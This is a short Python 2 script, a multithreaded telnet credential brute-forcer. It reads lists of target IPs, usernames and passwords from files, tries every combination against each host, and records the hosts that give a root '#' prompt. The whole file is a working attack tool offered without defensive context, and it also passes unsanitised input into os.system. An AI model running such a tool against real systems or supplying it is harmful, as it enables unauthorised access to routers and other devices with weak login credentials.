import re,sys,os,time
import threading
import pexpect

def telnet(ip,user,pwd):
    child = pexpect.spawn('telnet %s' % ip)
    index = child.expect (['ame', 'nter','ccount',':',pexpect.TIMEOUT,pexpect.EOF],timeout=8) 
    if index > 3 :  
        print "someting is wrong" 
    child.sendline (user)  
    child.expect ('ass')
    child.sendline(pwd)
    index = child.expect (['#'])
    #print index
    #print child.before
    if index == 0:
        print ip + ":" + user +":" + pwd + ":" "success"
        os.system("echo %s >>aaa.txt " %(ip) )
    else:
        print "false"
    return 1;

def userpwd(ips,user,pwd):
    #user=open('user')
    i=0
    for u in user:
        #u=line.strip('\n')
        #pwd =open('pwd')
        for p in pwd:
            #p = line.strip('\n')
            #print u,p
            for ip in ips:
                #print ip,u,p           
                t=threading.Thread(target=telnet,args=(ip,u,p,))
                t.start()
            #telnet(ip,user,pwd)

if __name__ == "__main__": 
    if len(sys.argv) != 1:
        print "usage: scanner.py thread_number"
        print "example: scanner.py ip.txt user.txt pwd.txt thread_number"
        sys.exit(1) 
    hosts = open('ip.txt')
    users = open('user.txt')
    pwds = open('pwd.txt')
    hosttotal=[]
    usertotal=[]
    pwdtotal=[]
    thread_number=5
    for line in hosts:
        host = line.strip('\n')
        hosttotal.append(host)
    for line in users:
        user = line.strip('\n')
        usertotal.append(user)
    for line in pwds:
        pwd = line.strip('\n')
        pwdtotal.append(pwd)
    #print iptotal
    for i in range(len(hosttotal)/thread_number+1) :
        ips=hosttotal[:thread_number]
        userpwd(ips,usertotal,pwdtotal)
        #print ips,usertotal,pwdtotal
        del hosttotal[:thread_number]

        
        

